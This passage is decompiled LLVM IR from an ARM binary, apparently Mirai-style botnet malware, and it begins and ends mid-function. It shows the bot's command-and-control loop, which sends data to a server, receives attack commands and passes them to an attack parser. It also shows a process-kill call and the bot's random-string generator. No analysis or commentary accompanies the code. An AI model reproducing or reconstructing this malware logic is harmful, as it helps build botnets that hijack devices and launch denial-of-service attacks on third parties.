  %v2_e150 = call i32 @util_strlen(i8* %v1_e150)
  %sext = mul i32 %v2_e150, 16777216
  %v1_e154 = sdiv i32 %sext, 16777216
  %v7_e154 = inttoptr i32 %v1_e154 to i8*
  store i8* %v7_e154, i8** %stack_var_-42, align 4
  %v0_e158 = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_24f10.62 to i32), i32* @lr, align 4
  %v0_e160 = load i32, i32* @r4, align 4
  store i32 %v0_e160, i32* %r2.global-to-local, align 4
  store i32 %v0_e158, i32* @global_var_24f10.62, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e170 = load i32, i32* @r5, align 4
  %v1_e170 = inttoptr i32 %v0_e170 to i32*
  %v2_e170 = load i32, i32* %v1_e170, align 4
  %v4_e174 = call i32 @__libc_send(i32 %v2_e170, i32 ptrtoint (i32* @global_var_19a70.120 to i32), i32 %v0_e160, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_e180 = load i32, i32* @r5, align 4
  %v1_e180 = inttoptr i32 %v0_e180 to i32*
  %v2_e180 = load i32, i32* %v1_e180, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_e18c = call i32 @__libc_send(i32 %v2_e180, i32 %v2_e080, i32 1, i32 16384)
  %v3_e190 = load i8*, i8** %stack_var_-42, align 4
  %v4_e190 = ptrtoint i8* %v3_e190 to i32
  store i32 %v4_e190, i32* %r2.global-to-local, align 4
  %v3_e194 = icmp eq i8* %v3_e190, null
  br i1 %v3_e194, label %dec_label_pc_dd70, label %dec_label_pc_e19c

dec_label_pc_e19c:                                ; preds = %dec_label_pc_e14c
  %v0_e19c = load i32, i32* @r5, align 4
  %v1_e19c = inttoptr i32 %v0_e19c to i32*
  %v2_e19c = load i32, i32* %v1_e19c, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e1a8 = call i32 @__libc_send(i32 %v2_e19c, i32 %v2_dbac, i32 %v4_e190, i32 16384)
  br label %dec_label_pc_dd70

dec_label_pc_e1b0:                                ; preds = %dec_label_pc_e220, %dec_label_pc_dfa4
  %v0_e1b0 = load i32, i32* @r5, align 4
  %v1_e1b0 = inttoptr i32 %v0_e1b0 to i32*
  %v2_e1b0 = load i32, i32* %v1_e1b0, align 4
  store i32 %v2_e1b0, i32* %r3.global-to-local, align 4
  %v7_e1b4 = icmp eq i32 %v2_e1b0, 4
  br i1 %v7_e1b4, label %dec_label_pc_dd70, label %bb44

bb44:                                             ; preds = %dec_label_pc_e1b0
  %v8_e1b8 = icmp eq i32 %v2_e1b0, 11
  br i1 %v8_e1b8, label %dec_label_pc_dd70, label %dec_label_pc_e1c0

dec_label_pc_e1c0:                                ; preds = %dec_label_pc_e244, %bb44, %dec_label_pc_dfd8
  %v2_e1c0 = load i32, i32* @global_var_22280.110, align 4
  store i32 57804, i32* @lr, align 4
  %v1_e1c8 = icmp ne i32 %v2_e1c0, -1
  call void @__pseudo_cond_branch(i1 %v1_e1c8, i32 ptrtoint (i32* @global_var_14a50.115 to i32))
  store i32 ptrtoint (i32* @global_var_22280.110 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_22280.110, align 4
  %v1_e1dc = call i32 @sleep(i32 1)
  br label %dec_label_pc_dd70

dec_label_pc_e1e4:                                ; preds = %dec_label_pc_e104
  %v2_e1e8 = call i32 @kill(i32 %v2_e138, i32 9)
  br label %dec_label_pc_e144

dec_label_pc_e1f0:                                ; preds = %dec_label_pc_dfe0
  %v3_e1f0 = udiv i32 %v4_dfe4, 256
  %v1_e1f4 = urem i32 %v4_dfe4, 256
  store i32 %v1_e1f4, i32* %r3.global-to-local, align 4
  %v4_e1f8 = mul nuw nsw i32 %v1_e1f4, 256
  %v5_e1f8 = or i32 %v4_e1f8, %v3_e1f0
  %v6_e1f8 = trunc i32 %v5_e1f8 to i16
  store i32 %v5_e1f8, i32* %r2.global-to-local, align 4
  store i32 %v2_de9c, i32* @lr, align 4
  %v7_e204 = inttoptr i32 %v5_e1f8 to i8*
  store i8* %v7_e204, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_e1f8, 1025
  br i1 %tmp45, label %dec_label_pc_e220, label %dec_label_pc_e20c

dec_label_pc_e20c:                                ; preds = %dec_label_pc_e1f0
  %v2_e20c = load i32, i32* @global_var_22280.110, align 4
  %v1_e210 = call i32 @__GI___libc_close(i32 %v2_e20c)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e218 = load i32, i32* @r8, align 4
  %v2_e218 = inttoptr i32 %v1_e218 to i32*
  store i32 -1, i32* %v2_e218, align 4
  br label %dec_label_pc_dd70

dec_label_pc_e220:                                ; preds = %dec_label_pc_e1f0
  %v0_e220 = load i32, i32* @r4, align 4
  %v1_e220 = load i32, i32* @r5, align 4
  %v2_e220 = inttoptr i32 %v1_e220 to i32*
  store i32 %v0_e220, i32* %v2_e220, align 4
  store i32 %v2_e228, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_e230 = load i32, i32* @global_var_22280.110, align 4
  %v7_e238 = call i32 @__libc_recv(i32 %v2_e230, i32 %v2_e228, i32 %v5_e1f8, i32 16386)
  %v7_e23c = icmp eq i32 %v7_e238, -1
  br i1 %v7_e23c, label %dec_label_pc_e1b0, label %dec_label_pc_e244

dec_label_pc_e244:                                ; preds = %dec_label_pc_e220
  %v2_e244 = icmp eq i32 %v7_e238, 0
  br i1 %v2_e244, label %dec_label_pc_e1c0, label %dec_label_pc_e24c

dec_label_pc_e24c:                                ; preds = %dec_label_pc_e244
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_e258 = load i32, i32* @global_var_22280.110, align 4
  %v4_e25c = call i32 @__libc_recv(i32 %v2_e258, i32 %v2_e080, i32 2, i32 16384)
  %v3_e264 = load i8*, i8** %stack_var_-42, align 4
  %v4_e264 = ptrtoint i8* %v3_e264 to i32
  %v3_e268 = udiv i32 %v4_e264, 256
  %v1_e26c = mul i32 %v4_e264, 256
  %v4_e270 = and i32 %v1_e26c, 65280
  %v5_e270 = or i32 %v4_e270, %v3_e268
  store i32 %v5_e270, i32* %ip.global-to-local, align 4
  store i32 %v2_de9c, i32* @lr, align 4
  store i32 %v5_e270, i32* %r2.global-to-local, align 4
  %v2_e280 = load i32, i32* @global_var_22280.110, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_e288 = inttoptr i32 %v5_e270 to i8*
  store i8* %v6_e288, i8** %stack_var_-42, align 4
  %v6_e28c = call i32 @__libc_recv(i32 %v2_e280, i32 %v2_e228, i32 %v5_e270, i32 16384)
  store i32 %v2_de9c, i32* %r2.global-to-local, align 4
  %v3_e294 = load i8*, i8** %stack_var_-42, align 4
  %v3_e298 = icmp eq i8* %v3_e294, null
  br i1 %v3_e298, label %dec_label_pc_dd70, label %dec_label_pc_e2a0

dec_label_pc_e2a0:                                ; preds = %dec_label_pc_e24c
  %v4_e294 = ptrtoint i8* %v3_e294 to i32
  %v5_e2a4 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_e294, i32 %v2_de9c)
  br label %dec_label_pc_dd70

; uselistorder directives
  uselistorder i8* %v3_e294, { 1, 0 }
  uselistorder i32 %v5_e270, { 1, 0, 2, 3 }
  uselistorder i32 %v7_e238, { 1, 0 }
  uselistorder i32 %v5_e1f8, { 1, 0, 3, 2 }
  uselistorder i32 %v3_e014, { 1, 3, 2, 0 }
  uselistorder i32 %v4_dfe4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_dfcc, { 1, 0 }
  uselistorder i32 %v2_df70, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_deb0, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_de98, { 1, 0, 2 }
  uselistorder i32 %v5_de64, { 1, 2, 0 }
  uselistorder i32 %v2_ddb0, { 2, 1, 0 }
  uselistorder i32 %v1_dda0, { 1, 2, 0 }
  uselistorder i32 %v1_dd84, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_e09c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e080, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_e078, { 1, 0 }
  uselistorder i32 %v2_de9c, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_dd6c, { 1, 0, 2 }
  uselistorder i32 %v2_dc10, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7, 15 }
  uselistorder i32 %v2_dbfc, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_db78, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_223fc.100, { 1, 2, 0 }
  uselistorder i8* null, { 0, 2, 1 }
  uselistorder i32 16386, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint (i8** @global_var_22400.113 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_22400.113 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_2227c.91, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_22280.110, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_22284.89, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d9a4.87 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_24f1c.96 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_e14c, { 1, 0 }
  uselistorder label %dec_label_pc_e144, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_deac, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_ddf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dde0, { 1, 0 }
  uselistorder label %dec_label_pc_dd70, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_dbd0, { 2, 0, 1 }
}

define i32 @function_e2d4(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_e2d4:
  %v0_e2d4 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_e2d4, i32 -22311544)
  %v0_e2dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_e2dc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_e2d4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %arg3, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_e2d4, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_e2f0 = load i32, i32* @global_var_22404.122, align 4
  %v2_e2f4 = load i32, i32* @global_var_22410.124, align 4
  %v4_e300 = mul i32 %v2_e2f0, 2048
  %v5_e300 = xor i32 %v4_e300, %v2_e2f0
  store i32 %v5_e300, i32* @r3, align 4
  %v4_e304 = udiv i32 %v2_e2f4, 524288
  %v5_e304 = xor i32 %v4_e304, %v2_e2f4
  %v2_e308 = load i32, i32* @global_var_22408.126, align 4
  %v2_e30c = load i32, i32* @global_var_2240c.128, align 4
  %v2_e310 = xor i32 %v5_e304, %v5_e300
  %v4_e314 = udiv i32 %v5_e300, 256
  %v5_e314 = xor i32 %v2_e310, %v4_e314
  store i32 %v2_e308, i32* @global_var_22404.122, align 4
  store i32 %v2_e30c, i32* @global_var_22408.126, align 4
  store i32 %v2_e2f4, i32* @global_var_2240c.128, align 4
  store i32 %v5_e314, i32* @global_var_22410.124, align 4
  ret i32 %v5_e314

; uselistorder directives
  uselistorder i32 %v2_e2f4, { 2, 1, 0 }
  uselistorder i32 %v2_e2f0, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_e34c = call i32 @__GI_time(i32* null)
  store i32 %v2_e34c, i32* @global_var_22404.122, align 4
  %v1_e358 = call i32 @__getpid(i32 %v2_e34c)
  store i32 %v1_e358, i32* @r0, align 4
  %v0_e360 = call i32 @getppid()
  %v2_e368 = xor i32 %v1_e358, %v0_e360
  store i32 %v2_e368, i32* @global_var_22408.126, align 4
  %v1_e370 = call i32 @clock(i32 %v2_e368)
  %v2_e374 = load i32, i32* @global_var_22408.126, align 4
  %v2_e380 = xor i32 %v2_e374, %v1_e370
  store i32 %v2_e380, i32* @global_var_22410.124, align 4
  store i32 %v1_e370, i32* @global_var_2240c.128, align 4
  ret i32 %v1_e370

; uselistorder directives
  uselistorder i32 %v1_e370, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e3a8 = load i32, i32* @r4, align 4
  %v6_e3a8 = load i32, i32* @r5, align 4
  %v9_e3a8 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e3bc = call i32 @table_unlock_val(i32 33)
  %v3_e3c8 = call i32 @table_retrieve_val(i32 33, i32* null)
  store i32 %v3_e3c8, i32* @r1, align 4
  %v2_e3d4 = bitcast i32* %stack_var_-72 to i8*
  %v3_e3d4 = call i32 @strcpy(i8* %v2_e3d4, i32 %v3_e3c8)
  %v2_e3d8 = icmp eq i32 %arg2, 0
  br i1 %v2_e3d8, label %dec_label_pc_e454, label %dec_label_pc_e3e0

dec_label_pc_e3e0:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22404.122 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22408.126 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2240c.128 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22410.124 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e438 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e3f4

dec_label_pc_e3f4:                                ; preds = %dec_label_pc_e3f4.dec_label_pc_e3f4_crit_edge, %dec_label_pc_e3e0
  %v1_e418 = phi i32 [ %v1_e418.pre, %dec_label_pc_e3f4.dec_label_pc_e3f4_crit_edge ], [ ptrtoint (i32* @global_var_22404.122 to i32), %dec_label_pc_e3e0 ]
  %v2_e3f4 = load i32, i32* @global_var_22410.124, align 4
  store i32 %v2_e3f4, i32* %r2.global-to-local, align 4
  %v2_e3f8 = load i32, i32* @global_var_22404.122, align 4
  %v4_e3fc = udiv i32 %v2_e3f4, 524288
  %v5_e3fc = xor i32 %v4_e3fc, %v2_e3f4
  %v4_e400 = mul i32 %v2_e3f8, 2048
  %v5_e400 = xor i32 %v4_e400, %v2_e3f8
  %v2_e404 = xor i32 %v5_e3fc, %v5_e400
  %v2_e408 = load i32, i32* @global_var_22408.126, align 4
  %v2_e40c = load i32, i32* @global_var_2240c.128, align 4
  store i32 %v2_e40c, i32* %ip.global-to-local, align 4
  %v4_e410 = udiv i32 %v5_e400, 256
  %v5_e410 = xor i32 %v2_e404, %v4_e410
  store i32 %v5_e410, i32* @r4, align 4
  %v2_e418 = inttoptr i32 %v1_e418 to i32*
  store i32 %v2_e408, i32* %v2_e418, align 4
  %v0_e41c = load i32, i32* %ip.global-to-local, align 4
  %v1_e41c = load i32, i32* %r8.global-to-local, align 4
  %v2_e41c = inttoptr i32 %v1_e41c to i32*
  store i32 %v0_e41c, i32* %v2_e41c, align 4
  %v0_e420 = load i32, i32* %r2.global-to-local, align 4
  %v1_e420 = load i32, i32* %r7.global-to-local, align 4
  %v2_e420 = inttoptr i32 %v1_e420 to i32*
  store i32 %v0_e420, i32* %v2_e420, align 4
  %v0_e424 = load i32, i32* @r4, align 4
  %v1_e424 = load i32, i32* @r6, align 4
  %v2_e424 = inttoptr i32 %v1_e424 to i32*
  store i32 %v0_e424, i32* %v2_e424, align 4
  %v2_e428 = call i32 @util_strlen(i8* %v2_e3d4)
  %v0_e430 = load i32, i32* @r4, align 4
  %v3_e434 = urem i32 %v0_e430, %v2_e428
  %v2_e43c = add i32 %v3_e434, %v2_e438
  %v1_e440 = add i32 %v2_e43c, -32
  %v2_e440 = inttoptr i32 %v1_e440 to i8*
  %v3_e440 = load i8, i8* %v2_e440, align 1
  %v2_e444 = load i32, i32* @r5, align 4
  %v3_e444 = load i32, i32* %fp.global-to-local, align 4
  %v4_e444 = add i32 %v3_e444, %v2_e444
  %v5_e444 = inttoptr i32 %v4_e444 to i8*
  store i8 %v3_e440, i8* %v5_e444, align 1
  %v0_e448 = load i32, i32* @r5, align 4
  %v1_e448 = add i32 %v0_e448, 1
  store i32 %v1_e448, i32* @r5, align 4
  %v1_e44c = load i32, i32* %sb.global-to-local, align 4
  %v9_e44c = icmp eq i32 %v1_e448, %v1_e44c
  br i1 %v9_e44c, label %dec_label_pc_e454, label %dec_label_pc_e3f4.dec_label_pc_e3f4_crit_edge

dec_label_pc_e3f4.dec_label_pc_e3f4_crit_edge:    ; preds = %dec_label_pc_e3f4
  %v1_e418.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e3f4

dec_label_pc_e454:                                ; preds = %dec_label_pc_e3f4, %entry
  %v1_e458 = call i32 @table_lock_val(i32 33)
  store i32 %v3_e3a8, i32* @r4, align 4
  store i32 %v6_e3a8, i32* @r5, align 4
  store i32 %v9_e3a8, i32* @r6, align 4
  ret i32 %v1_e458

; uselistorder directives
  uselistorder i32 %v2_e3f8, { 1, 0 }
  uselistorder i32 %v2_e3f4, { 1, 0, 2 }
}

define i32 @rand_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_e478 = load i32, i32* @r0, align 4
  ret i32 %v3_e478
}

define i32 @function_e47c(i16* %arg1) local_unnamed_addr {
dec_label_pc_e47c:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_e47c = load i32, i32* @r4, align 4
  store i32 %v3_e47c, i32* %stack_var_-28, align 4
  %v0_e480 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e480, i32* %r5.global-to-local, align 4
  %v0_e484 = load i1, i1* @cpsr_z, align 1
  %v1_e484 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_e484 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v3_e484 = xor i1 %v1_e484, %v2_e484
  %v4_e484 = or i1 %v0_e484, %v3_e484
  br i1 %v4_e484, label %dec_label_pc_e528, label %dec_label_pc_e488

dec_label_pc_e488:                                ; preds = %dec_label_pc_e47c
  store i32 ptrtoint (i32* @global_var_22410.124 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2240c.128 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22408.126 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22404.122 to i32), i32* %r6.global-to-local, align 4
  %v2_e498 = load i32, i32* @global_var_22410.124, align 4
  store i32 %v2_e498, i32* %lr.global-to-local, align 4
  %v2_e49c = load i32, i32* @global_var_2240c.128, align 4
  store i32 %v2_e49c, i32* %r4.global-to-local, align 4
  %v2_e4a0 = load i32, i32* @global_var_22408.126, align 4
  store i32 %v2_e4a0, i32* %r0.global-to-local, align 4
  %v2_e4a4 = load i32, i32* @global_var_22404.122, align 4
  %v0_e4d4.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_e4c8

dec_label_pc_e4ac:                                ; preds = %dec_label_pc_e4e8
  %v1_e4ac = trunc i32 %v5_e4d8 to i16
  %v3_e4ac = inttoptr i32 %v9_e4dc to i16*
  store i16 %v1_e4ac, i16* %v3_e4ac, align 2
  %v4_e4ac = load i32, i32* %r5.global-to-local, align 4
  %v5_e4ac = add i32 %v4_e4ac, -2
  store i32 %v5_e4ac, i32* %r5.global-to-local, align 4
  %v0_e4b0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_e4b0

dec_label_pc_e4b0:                                ; preds = %.thread, %dec_label_pc_e4ac
  %v0_e4b0 = phi i32 [ %v9_e4e0, %.thread ], [ %v0_e4b0.pre, %dec_label_pc_e4ac ]
  %v2_e4ac5 = phi i32 [ %v12_e4dc, %.thread ], [ %v5_e4ac, %dec_label_pc_e4ac ]
  %tmp16 = icmp slt i32 %v0_e4b0, 1
  br i1 %tmp16, label %dec_label_pc_e530, label %dec_label_pc_e4bc

dec_label_pc_e4bc:                                ; preds = %dec_label_pc_e4b0
  %v0_e4b4 = load i32, i32* %r0.global-to-local, align 4
  %v0_e4bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e4bc, i32* %r0.global-to-local, align 4
  %v0_e4c0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e4c0, i32* %r4.global-to-local, align 4
  %v0_e4c4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e4c4, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e4c8

dec_label_pc_e4c8:                                ; preds = %dec_label_pc_e488, %dec_label_pc_e4bc
  %v0_e514 = phi i32 [ %v2_e4a0, %dec_label_pc_e488 ], [ %v0_e4bc, %dec_label_pc_e4bc ]
  %v9_e4dc = phi i32 [ %v0_e480, %dec_label_pc_e488 ], [ %v2_e4ac5, %dec_label_pc_e4bc ]
  %v0_e4f4 = phi i32 [ %v0_e4d4.pre, %dec_label_pc_e488 ], [ %v0_e4b0, %dec_label_pc_e4bc ]
  %v0_e508 = phi i32 [ %v2_e498, %dec_label_pc_e488 ], [ %v0_e4c4, %dec_label_pc_e4bc ]
  %v0_e504 = phi i32 [ %v2_e4a4, %dec_label_pc_e488 ], [ %v0_e4b4, %dec_label_pc_e4bc ]
  %v4_e4c8 = mul i32 %v0_e504, 2048
  %v5_e4c8 = xor i32 %v4_e4c8, %v0_e504
  %v4_e4cc = udiv i32 %v0_e508, 524288
  %v5_e4cc = xor i32 %v4_e4cc, %v0_e508
  %v2_e4d0 = xor i32 %v5_e4cc, %v5_e4c8
  %v4_e4d8 = udiv i32 %v5_e4c8, 256
  %v5_e4d8 = xor i32 %v2_e4d0, %v4_e4d8
  store i32 %v5_e4d8, i32* %r3.global-to-local, align 4
  %v7_e4dc = icmp sgt i32 %v0_e4f4, 3
  br i1 %v7_e4dc, label %.thread, label %dec_label_pc_e4e8

.thread:                                          ; preds = %dec_label_pc_e4c8
  %v10_e4dc = inttoptr i32 %v9_e4dc to i32*
  store i32 %v5_e4d8, i32* %v10_e4dc, align 4
  %v11_e4dc = load i32, i32* %r5.global-to-local, align 4
  %v12_e4dc = add i32 %v11_e4dc, 4
  store i32 %v12_e4dc, i32* %r5.global-to-local, align 4
  %v8_e4e0 = load i32, i32* @r1, align 4
  %v9_e4e0 = add i32 %v8_e4e0, -4
  store i32 %v9_e4e0, i32* @r1, align 4
  br label %dec_label_pc_e4b0

dec_label_pc_e4e8:                                ; preds = %dec_label_pc_e4c8
  %v7_e4f4 = icmp eq i32 %v0_e4f4, 1
  store i32 %v5_e4d8, i32* %r3.global-to-local, align 4
  %v1_e4fc = add i32 %v0_e4f4, -2
  store i32 %v1_e4fc, i32* @r1, align 4
  br i1 %v7_e4f4, label %dec_label_pc_e504, label %dec_label_pc_e4ac

dec_label_pc_e504:                                ; preds = %dec_label_pc_e4e8
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i32 %v5_e4d8, i32* %r3.global-to-local, align 4
  %v1_e514 = load i32, i32* %r6.global-to-local, align 4
  %v2_e514 = inttoptr i32 %v1_e514 to i32*
  store i32 %v0_e514, i32* %v2_e514, align 4
  %v0_e518 = load i32, i32* %r4.global-to-local, align 4
  %v1_e518 = load i32, i32* %r7.global-to-local, align 4
  %v2_e518 = inttoptr i32 %v1_e518 to i32*
  store i32 %v0_e518, i32* %v2_e518, align 4
  %v0_e51c = load i32, i32* %lr.global-to-local, align 4
  %v1_e51c = load i32, i32* %r8.global-to-local, align 4
  %v2_e51c = inttoptr i32 %v1_e51c to i32*
  store i32 %v0_e51c, i32* %v2_e51c, align 4
  %v0_e520 = load i32, i32* %r3.global-to-local, align 4
  %v1_e520 = load i32, i32* %sl.global-to-local, align 4
  %v2_e520 = inttoptr i32 %v1_e520 to i32*
  store i32 %v0_e520, i32* %v2_e520, align 4
  %v0_e524 = load i32, i32* %r3.global-to-local, align 4
  %v1_e524 = trunc i32 %v0_e524 to i8
  %v2_e524 = load i32, i32* %r5.global-to-local, align 4
  %v3_e524 = inttoptr i32 %v2_e524 to i8*
  store i8 %v1_e524, i8* %v3_e524, align 1
  br label %dec_label_pc_e528

dec_label_pc_e528:                                ; preds = %dec_label_pc_e47c, %dec_label_pc_e530, %dec_label_pc_e504
  %v2_e528 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e528, i32* %r4.global-to-local, align 4
  %v1_e52c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e52c

dec_label_pc_e530:                                ; preds = %dec_label_pc_e4b0
  %v1_e4b0 = icmp ne i32 %v0_e4b0, 0
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v1_e4b0, i1* %cpsr_n.global-to-local, align 1
  %v0_e530 = load i32, i32* %r3.global-to-local, align 4
  %v1_e530 = load i32, i32* %sl.global-to-local, align 4
  %v2_e530 = inttoptr i32 %v1_e530 to i32*
  store i32 %v0_e530, i32* %v2_e530, align 4
  %v0_e534 = load i32, i32* %lr.global-to-local, align 4
  %v1_e534 = load i32, i32* %r8.global-to-local, align 4
  %v2_e534 = inttoptr i32 %v1_e534 to i32*
  store i32 %v0_e534, i32* %v2_e534, align 4
  %v0_e538 = load i32, i32* %r4.global-to-local, align 4
  %v1_e538 = load i32, i32* %r7.global-to-local, align 4
  %v2_e538 = inttoptr i32 %v1_e538 to i32*
  store i32 %v0_e538, i32* %v2_e538, align 4
  %v0_e53c = load i32, i32* %r0.global-to-local, align 4
  %v1_e53c = load i32, i32* %r6.global-to-local, align 4
  %v2_e53c = inttoptr i32 %v1_e53c to i32*
  store i32 %v0_e53c, i32* %v2_e53c, align 4
  br label %dec_label_pc_e528

; uselistorder directives
  uselistorder i32 %v9_e4e0, { 1, 0 }
  uselistorder i32 %v12_e4dc, { 1, 0 }
  uselistorder i32 %v5_e4d8, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e504, { 1, 0 }
  uselistorder i32 %v0_e508, { 1, 0 }
  uselistorder i32 %v0_e4f4, { 1, 0, 2 }
  uselistorder i32 %v0_e4b0, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i1* %cpsr_v.global-to-local, { 3, 2, 0, 1 }
  uselistorder i1* %cpsr_n.global-to-local, { 3, 2, 0, 1 }
  uselistorder i32* @global_var_22404.122, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_22404.122 to i32), { 1, 0, 2 }
